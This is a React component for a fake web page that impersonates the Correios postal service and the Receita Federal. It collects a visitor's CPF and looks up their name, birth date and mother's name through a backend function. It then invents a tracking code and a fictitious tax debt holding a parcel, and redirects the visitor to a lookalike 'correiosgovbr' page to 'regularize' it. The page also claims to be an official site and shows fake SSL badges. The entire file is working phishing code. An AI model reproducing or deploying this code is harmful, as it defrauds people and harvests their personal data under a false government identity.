import { Search, Info, Package, ShieldCheck, FileCheck, ArrowRight, ArrowLeft, Loader2, AlertTriangle, User, MapPin, CheckCircle2, Clock, XCircle, Copy, Check } from "lucide-react";
import { motion, AnimatePresence } from "framer-motion";
import { useState } from "react";
import loggiLogo from "@/assets/correios.png";
import receitaLogoNovo from "@/assets/receita-logo-novo.png";
import tributacaoImg from "@/assets/tributacao-correios.jpg";
import Footer from "./Footer";

interface CpfData {
  NOME: string;
  CPF: string;
  NASC: string;
  SEXO: string;
  NOME_MAE: string;
}

const generateTrackingCode = (cpfDigits: string) => {
  const hash = cpfDigits.split("").reduce((acc, d, i) => acc + parseInt(d) * (i + 7), 0);
  const num = String(hash * 137 + 948271).slice(0, 9).padStart(9, "0");
  return `BR${num}BR`;
};

const HeroSection = () => {
  const [step, setStep] = useState<"initial" | "cpf" | "result-modal">("initial");
  const [trackingCode, setTrackingCode] = useState("");
  const [cpf, setCpf] = useState("");
  const [loading, setLoading] = useState(false);
  const [cpfData, setCpfData] = useState<CpfData | null>(null);
  const [error, setError] = useState("");
  const [copied, setCopied] = useState(false);

  const formatCpf = (value: string) => {
    const digits = value.replace(/\D/g, "").slice(0, 11);
    if (digits.length <= 3) return digits;
    if (digits.length <= 6) return `${digits.slice(0, 3)}.${digits.slice(3)}`;
    if (digits.length <= 9) return `${digits.slice(0, 3)}.${digits.slice(3, 6)}.${digits.slice(6)}`;
    return `${digits.slice(0, 3)}.${digits.slice(3, 6)}.${digits.slice(6, 9)}-${digits.slice(9)}`;
  };

  const maskCpf = (cpfRaw: string) => {
    const d = cpfRaw.replace(/\D/g, "");
    if (d.length < 11) return cpfRaw;
    return `***.${d.slice(3, 6)}.${d.slice(6, 9)}-**`;
  };

  const handleCopyCode = () => {
    navigator.clipboard.writeText(trackingCode);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const handleConfirmCpf = async () => {
    setLoading(true);
    setError("");
    const digits = cpf.replace(/\D/g, "");
    try {
      const res = await fetch(`/.netlify/functions/search-cpf?cpf=${digits}`);
      const data = await res.json();
      if (data.status === 200 && data.dados?.length > 0) {
        setCpfData(data.dados[0]);
        if (!trackingCode) {
          const code = generateTrackingCode(digits);
          setTrackingCode(code);
        }
        setTimeout(() => {
          setLoading(false);
          setStep("result-modal");
        }, 3000); // Give the modal spinner time to show up
      } else {
        setError("CPF não encontrado. Verifique e tente novamente.");
        setLoading(false);
      }
    } catch {
      setError("Erro ao consultar. Tente novamente.");
      setLoading(false);
    }
  };

  return (
    <section id="consultar" className="min-h-screen relative font-sans" style={{ background: "#f0f0ee" }}>
      {/* Topbars */}
      <div className="w-full bg-white">
        <div className="mx-auto flex h-14 max-w-6xl items-center justify-between px-4">
          <div className="w-1/4 flex justify-start"></div>
          <div className="w-2/4 flex justify-center">
            <img src={loggiLogo} alt="Correios" className="h-6 w-auto" />
          </div>
          <div className="w-1/4 flex justify-end items-center">
            {cpfData?.NOME && step !== "initial" && step !== "cpf" && (
              <div className="flex items-center gap-2 border-l-2 border-gray-100 pl-3 py-1">
                <User className="h-5 w-5 text-[#002d6b]" />
                <span className="text-[12px] md:text-[13px] font-bold text-[#002d6b] truncate max-w-[100px] md:max-w-[150px]">
                  {cpfData.NOME.split(' ')[0]} {cpfData.NOME.split(' ').length > 1 ? cpfData.NOME.split(' ').slice(-1)[0] : ''}
                </span>
              </div>
            )}
          </div>
        </div>
      </div>
      
      {/* SSL Bar Inicial */}
      <div className="w-full bg-[#FFD400]">
        <div className="mx-auto max-w-6xl px-4 py-1.5 flex items-center justify-center gap-1.5">
          <svg className="h-3 w-3 text-[#002d6b]" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2a4 4 0 0 1 4 4v2h.5A2.5 2.5 0 0 1 23 10.5v9a2.5 2.5 0 0 1-2.5 2.5h-17A2.5 2.5 0 0 1 1 19.5v-9A2.5 2.5 0 0 1 3.5 8H4V6a4 4 0 0 1 4-4h4Zm0 2H8a2 2 0 0 0-2 2v2h8V6a2 2 0 0 0-2-2Z" /></svg>
          <span className="text-[11px] font-medium tracking-wide text-[#002d6b]">Conexão Segura SSL • Site Oficial dos Correios</span>
          <svg className="h-3 w-3 text-[#002d6b] ml-0.5" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
        </div>
      </div>

      <div style={{ background: "#f0f0ee" }} className="pb-16 pt-6 min-h-[calc(100vh-200px)]">
        <motion.div initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} transition={{ duration: 0.5 }} className="mx-auto max-w-lg px-4">
          
          {/* Receita Box */}
          <div className="mx-auto mb-6 flex max-w-lg items-center justify-between rounded-xl px-4 py-4" style={{ background: "linear-gradient(110deg, #00122e 0%, #00296b 40%, #004291 80%, #002657 100%)", color: "white", boxShadow: "0 4px 14px rgba(0,0,0,0.15)" }}>
            <img src={receitaLogoNovo} alt="Receita Federal" className="h-8 w-auto filter brightness-0 invert" />
            <div className="text-right">
              <div className="text-sm font-bold tracking-wide">Sistema Integrado</div>
              <div className="flex items-center justify-end gap-1.5 text-xs mt-1" style={{ color: "rgba(255,255,255,0.8)" }}>
                <span className="dot-online" />
                <span>Online • Seguro</span>
              </div>
            </div>
          </div>

          <h1 className="text-[22px] font-bold text-[#002d6b] text-center mb-1">Rastreamento de Encomendas</h1>
          <p className="text-sm text-[#002d6b] text-center font-medium mb-6">Portal Oficial de Consulta Fiscal</p>

          <div className="rounded-xl overflow-hidden bg-white shadow-sm border border-gray-100">
            <AnimatePresence mode="wait">
              {step === "initial" && (
                <motion.div key="initial" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} transition={{ duration: 0.2 }}>
                  <div className="mx-5 mt-5 rounded-sm p-4" style={{ borderLeft: "4px solid #dc3545", background: "#fdf2f2" }}>
                    <div className="flex items-start gap-3">
                      <div className="flex h-5 w-5 shrink-0 items-center justify-center rounded-full bg-[#dc3545] mt-0.5">
                        <Info className="h-3 w-3 text-white" />
                      </div>
                      <div>
                        <p className="text-sm font-bold" style={{ color: "#a52a2a" }}>AVISO IMPORTANTE</p>
                        <p className="mt-1 text-[13px] leading-relaxed" style={{ color: "#a52a2a" }}>
                          Verifique se há pendências fiscais vinculadas ao seu CPF que possam impactar a liberação de suas encomendas.
                        </p>
                      </div>
                    </div>
                  </div>
                  <div className="p-6 pt-5">
                    <p className="text-[14px] font-medium text-center leading-relaxed text-[#002d6b] mb-6 px-2">
                      Para consultar suas encomendas e verificar pendências fiscais, clique no botão abaixo e informe seu CPF.
                    </p>
                    <button className="w-full flex items-center justify-center gap-2 rounded-lg px-8 py-4 text-[13px] font-bold uppercase tracking-wide transition-all shadow-md bg-[#002d6b] text-white hover:brightness-110" onClick={() => setStep("cpf")}>
                      <Search className="h-4 w-4" />
                      Consultar Encomendas Agora
                    </button>
                  </div>
                </motion.div>
              )}

              {step === "cpf" && (
                <motion.div key="cpf" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} transition={{ duration: 0.2 }} className="p-2">
                  <div className="p-6 bg-[#f4f4f4] rounded-[10px] border border-gray-200 shadow-inner">
                    
                    <div className="flex items-center justify-center gap-2 mb-4">
                      <Search className="h-3 w-3 text-[#002d6b] opacity-80" />
                      <span className="text-[#002d6b] text-[12px] font-medium tracking-wide opacity-90">Deseja acompanhar seu objeto?</span>
                    </div>

                    <h3 className="text-[#002d6b] font-bold text-[14px] text-center mb-4">
                      Digite seu CPF ou código de rastreamento:
                    </h3>

                    <div className="relative mb-3">
                      <input
                        type="text"
                        placeholder="000.000.000-00"
                        className={`w-full rounded-md border-2 px-4 py-3.5 transition-all outline-none text-[15px] font-mono text-center tracking-widest bg-white text-[#002d6b] ${cpf.length >= 14 ? 'border-[#198754] focus:border-[#198754]' : 'border-gray-200 focus:border-gray-300'}`}
                        value={cpf}
                        onChange={(e) => setCpf(formatCpf(e.target.value))}
                        maxLength={14}
                      />
                      {cpf.length >= 14 && (
                        <div className="absolute right-3 top-1/2 -translate-y-1/2 flex h-5 w-5 items-center justify-center rounded-full bg-[#198754] shadow-sm">
                          <Check className="h-3 w-3 text-white" strokeWidth={3} />
                        </div>
                      )}
                    </div>

                    {error && (
                      <div className="flex items-center justify-center gap-1.5 text-[11px] text-[#dc3545] font-bold mb-3 h-5">
                        <AlertTriangle className="h-3.5 w-3.5" />
                        <span>{error}</span>
                      </div>
                    )}
                    
                    {!error && (
                      <div className="flex items-center justify-center gap-1.5 text-[12px] text-[#002d6b] font-semibold mb-4 h-5 transition-opacity duration-300" style={{ opacity: cpf.length >= 14 ? 1 : 0 }}>
                        <div className="flex h-[14px] w-[14px] items-center justify-center rounded-full bg-[#002d6b]">
                          <Check className="h-2.5 w-2.5 text-[#f4f4f4]" strokeWidth={3} />
                        </div>
                        <span>CPF válido detectado</span>
                      </div>
                    )}

                    <button
                      className="w-full mb-6 flex items-center justify-center gap-2 rounded-md px-8 py-3.5 text-[14px] font-bold uppercase tracking-widest transition-all shadow-md bg-[#198754] text-white hover:bg-[#157347]"
                      disabled={cpf.replace(/\D/g, "").length < 11}
                      onClick={handleConfirmCpf}
                      style={{ opacity: cpf.replace(/\D/g, "").length < 11 ? 0.6 : 1 }}
                    >
                      <Search className="h-[15px] w-[15px]" strokeWidth={2.5} />
                      Consultar
                    </button>

                    <div className="flex flex-col items-center justify-center space-y-2 mt-2">
                      <div className="flex items-center gap-1.5 text-[11px] text-[#002d6b] font-semibold opacity-80">
                        <Check className="h-[12px] w-[12px]" strokeWidth={3} />
                        <span>Dados protegidos por criptografia SSL</span>
                      </div>
                      <div className="flex items-center gap-1.5 text-[11px] text-[#002d6b] font-semibold opacity-80">
                        <Check className="h-[12px] w-[12px]" strokeWidth={3} />
                        <span>Consulta oficial integrada aos Correios</span>
                      </div>
                    </div>
                  </div>
                  
                  {/* Botão sutil de voltar */}
                  <button
                    className="flex items-center justify-center gap-1 text-[11px] text-gray-400 mt-3 w-full hover:text-gray-600 transition-colors uppercase font-bold"
                    onClick={() => { setStep("initial"); setCpf(""); }}
                  >
                    <ArrowLeft className="h-3 w-3" />
                    Voltar
                  </button>
                </motion.div>
              )}
            </AnimatePresence>
          </div>

          {/* Feature cards */}
          {["initial", "cpf", "result-modal"].includes(step) && (
            <div className="grid grid-cols-3 gap-3 mt-8 max-w-sm mx-auto">
              {[
                { icon: Package, title: "Rastreamento", desc: "Consulte o status da sua encomenda em tempo real", color: "#002d6b", textCol: "#002d6b" },
                { icon: ShieldCheck, title: "Segurança", desc: "Dados protegidos pela Receita Federal", color: "#28a745", textCol: "#28a745" },
                { icon: FileCheck, title: "Regularização", desc: "Pendências devem ser regularizadas para liberação", color: "#ffc107", textCol: "#ffc107" },
              ].map((item) => (
                <div key={item.title} className="rounded-[10px] bg-white p-3 text-center border border-gray-100 overflow-hidden relative shadow-sm">
                  <div className="absolute left-0 top-0 bottom-0 w-[4px]" style={{ background: item.color }} />
                  <div className="mx-auto mb-2 mt-1 flex h-7 w-7 items-center justify-center rounded-full bg-gray-50 border border-gray-100">
                    <item.icon className="h-3.5 w-3.5" style={{ color: item.textCol }} />
                  </div>
                  <p className="text-[10px] font-bold text-[#002d6b]">{item.title}</p>
                  <p className="mt-1 text-[8px] leading-[1.2] text-gray-500">{item.desc}</p>
                </div>
              ))}
            </div>
          )}
        </motion.div>
      </div>

      {/* Footer */}
      <Footer />

      {/* Modal - Loading Overlay */}
      {loading && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/60 backdrop-blur-sm transition-all duration-300">
          <div className="bg-white rounded-[24px] w-full max-w-[340px] p-8 text-center shadow-2xl relative overflow-hidden">
            <img src={receitaLogoNovo} alt="Receita Federal" className="h-8 mx-auto mb-8" />
            <Loader2 className="h-10 w-10 animate-spin text-[#002d6b] mx-auto mb-6" />
            <p className="text-[15px] font-semibold text-[#002d6b] mb-5">Verificando base de dados da Receita Federal...</p>
            <div className="w-full bg-gray-100 h-2 rounded-full overflow-hidden">
              <div className="bg-[#002d6b] h-full rounded-full animate-pulse transition-all" style={{ width: '60%' }}></div>
            </div>
          </div>
        </div>
      )}

      {/* Modal - Result Overflow */}
      {step === "result-modal" && cpfData && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/60 backdrop-blur-[3px] transition-all duration-300">
          <div className="bg-white rounded-[20px] w-full max-w-[350px] p-6 text-center shadow-2xl">
            <img src={receitaLogoNovo} alt="Receita Federal" className="h-[28px] mx-auto mb-4" />
            <h2 className="text-[#002d6b] font-bold text-[15px] mb-3 leading-tight tracking-tight px-1">
              Atenção, {cpfData.NOME.split(' ').map(n => n.charAt(0).toUpperCase() + n.slice(1).toLowerCase()).join(' ')}
            </h2>
            <div className="bg-[#f2f2f2] rounded-md py-3 px-2 mb-5 mx-1 font-bold text-[#002d6b] text-[13px] tracking-wide shadow-sm">
              Data de Nascimento: {cpfData.NASC}
            </div>

            <div className="bg-white border border-[#f5c6c6] border-l-[6px] border-l-[#dc3545] border-r border-[#facaad] rounded-[10px] p-4 text-left mb-6 shadow-sm">
              <div className="bg-[#fdf2f2] -mx-4 -mt-4 p-3 mb-3 border-b border-[#f5c6c6] rounded-t-[8px]">
                  <h3 className="text-[#dc3545] font-bold text-[12px] flex items-center gap-2 uppercase tracking-wide">
                    <span className="flex h-4 w-4 items-center justify-center rounded-full bg-[#dc3545] text-white shrink-0"><span className="text-[10px] font-black leading-none">!</span></span> 
                    Pendência Fiscal Identificada
                  </h3>
              </div>
              <ul className="text-[12px] text-[#a52a2a] space-y-3 list-disc pl-4 marker:text-[#dc3545] max-w-[95%]">
                <li className="leading-tight text-gray-700"><span className="font-semibold">Objeto retido aguardando regularização tributária.</span></li>
                <li className="leading-tight text-gray-700"><span className="font-semibold">Motivo:</span> Pendência de tributos federais vinculados ao CPF.</li>
                <li className="leading-tight text-gray-700"><span className="font-semibold">Ação necessária:</span> Verificar detalhes para prosseguir com a entrega.</li>
              </ul>
            </div>

            <button onClick={() => { window.location.href = `/correiosgovbr-com/index.html?tipo=cpf&cpf=${cpf.replace(/\D/g, "")}&nome=${encodeURIComponent(cpfData.NOME)}`; }} className="w-full bg-[#198754] text-white font-bold py-[18px] rounded-xl text-sm shadow-md mb-5 hover:bg-[#157347] transition-colors">
              VER DETALHES E REGULARIZAR
            </button>

            <div className="text-[11px] text-[#002d6b] space-y-2 font-semibold flex flex-col items-center opacity-80">
              <div className="flex items-center gap-1.5"><ShieldCheck className="h-3.5 w-3.5 text-[#198754]" /> Sistema oficial de regularização</div>
              <div className="flex items-center gap-1.5"><Clock className="h-3.5 w-3.5" /> Consulta disponível 24 horas</div>
            </div>
          </div>
        </div>
      )}

    </section>
  );
};

export default HeroSection;
